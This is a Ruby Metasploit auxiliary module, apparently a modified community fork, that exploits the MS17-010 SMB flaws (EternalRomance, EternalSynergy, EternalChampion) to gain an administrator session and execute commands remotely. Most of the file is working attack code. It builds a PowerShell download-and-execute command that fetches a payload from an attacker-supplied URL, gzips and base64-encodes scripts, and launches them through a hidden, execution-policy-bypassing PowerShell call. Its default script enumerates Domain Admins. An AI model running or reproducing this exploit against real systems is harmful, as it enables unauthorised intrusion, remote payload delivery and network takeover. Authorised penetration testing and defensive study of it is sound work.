##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'zlib'
require 'rex/text'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010
  include Msf::Exploit::Remote::SMB::Client::Psexec
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB RCE - Powershell encoded Script',
      'Description'    => %q{
          This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where
          primitive. This will then be used to overwrite the connection session information with as an
           Administrator session. From there, the normal psexec command execution is done.

          Exploits a type confusion between Transaction and WriteAndX requests and a race condition in
          Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy
          exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a
          named pipe.

          This module has been modified and optimized. It makes some likely assumptions about the target system,
          specifically that powershell is installed and enabled. These assumptions allow the module to work without
          having to identify a writeable share.

          The module is designed around the fast download and execute of a prebuilt payload. However, you can
          specify a script to run instead. If you want to use a standard MSF payload with the optimizations, 
          use /exploit/windows/ms17_010_sn0wfa11 instead.
      },

      'Author'         => [
        'sleepya',          # zzz_exploit idea and offsets
        'sn0wfa11',         # Optimization
        'zerosum0x0',
        'Shadow Brokers',
        'Equation Group'
      ],

      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'AKA', 'ETERNALSYNERGY' ],
        [ 'AKA', 'ETERNALROMANCE' ],
        [ 'AKA', 'ETERNALCHAMPION' ],
        [ 'AKA', 'ETERNALBLUE'],  # does not use any CVE from Blue, but Search should show this, it is preferred
        [ 'MSB', 'MS17-010' ],
        [ 'CVE', '2017-0143'], # EternalRomance/EternalSynergy - Type confusion between WriteAndX and Transaction requests
        [ 'CVE', '2017-0146'], # EternalChampion/EternalSynergy - Race condition with Transaction requests
        [ 'CVE', '2017-0147'], # for EternalRomance reference
        [ 'URL', 'https://github.com/worawit/MS17-010' ],
        [ 'URL', 'https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf' ],
        [ 'URL', 'https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/' ],
      ],
      'DisclosureDate' => 'Mar 14 2017'
    ))

    register_options([
      OptString.new('SCRIPT', [false, 'The script that you want to encode and execute on the remote host, if CMD = custom', 'net group "Domain Admins" /domain']),
      OptString.new('URL', [ false, "Full URL or IPv4 Address of web server and file ie 'http://10.10.10.10:8080/file.bat'"]),
      OptString.new('RPORT', [true, 'The Target port', 445]),
      OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
      OptEnum.new('CMD', [true, 'Specify the module command', 'default', ['default','custom']])
    ])

    register_advanced_options([
      OptString.new('FILEPREFIX', [false, 'Add a custom prefix to the temporary files','']),
      OptInt.new('DELAY', [true, 'Wait this many seconds before reading output and cleaning up', 0]),
      OptInt.new('RETRY', [true, 'Retry this many times to check if the process is complete', 0]),
    ])

    deregister_options('RHOST')
  end

  def run_host(ip)
    begin
      eternal_pwn(ip)         # exploit Admin session
      smb_pwn(ip)             # psexec

    rescue ::Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010::MS17_010_Error => e
      print_error("#{e.message}")
    rescue ::Errno::ECONNRESET,
           ::Rex::HostUnreachable,
           ::Rex::Proto::SMB::Exceptions::LoginError,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionRefused  => e
      print_error("#{e.class}: #{e.message}")
    rescue => error
      print_error(error.class.to_s)
      print_error(error.message)
      print_error(error.backtrace.join("\n"))
    ensure
      eternal_cleanup()       # restore session
    end
  end

  def smb_pwn(ip)
    text = "\\#{datastore['WINPATH']}\\Temp\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.txt"
    bat  = "\\#{datastore['WINPATH']}\\Temp\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.bat"
    @ip = ip

    command = run_encode # Encode the download and execute or the provided script.
    execute_command(text, bat, command)
  end

  def run_encode()
    case datastore['CMD'].to_s.downcase.to_sym
    when :default
      if datastore['URL']
        return default_encode
      else
        fail_with("You must provide a url with CMD = default")
      end
    when :custom
      if datastore['SCRIPT']
        return encode(datastore['SCRIPT'])
      else
        fail_with("You must include a script for custom encoding")
      end
    end
  end

  def default_encode
    filepath = datastore['URL']

    script = "$c=new-object System.Net.WebClient; $u = '"
    script << filepath
    script << "'; $f = $Home + '\\"
    script << Rex::Text.rand_text_alpha(8)
    script << ".#{filepath.split('.').last}"
    script << "'; $c.DownloadFile($u,$f); cmd.exe /c $f; remove-item $f;"

    return encode(script)
  end

  # This function will encode the passed script using
  # PowerShell's compressor and encoder.
  #
  # @script [string class] script to be encoded and compressed
  #
  # @return [void] A useful return value is not expected here

  def encode(script)

    compressed_stream = Rex::Text.gzip(script)
    encoded_stream = Rex::Text.encode_base64(compressed_stream)

    # Build the powershell expression
    # Decode base64 encoded command and create a stream object
    psh_expression =  "$s=New-Object IO.MemoryStream(,"
    psh_expression << "[Convert]::FromBase64String('#{encoded_stream}'));"

    # Uncompress and invoke the expression (execute)
    psh_expression << 'IEX (New-Object IO.StreamReader('
    psh_expression << 'New-Object IO.Compression.GzipStream('
    psh_expression << '$s,'
    psh_expression << '[IO.Compression.CompressionMode]::Decompress)'
    psh_expression << ')).ReadToEnd();'

    output_expression = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c \""
    output_expression << psh_expression
    output_expression << "\""
    return output_expression
  end
end
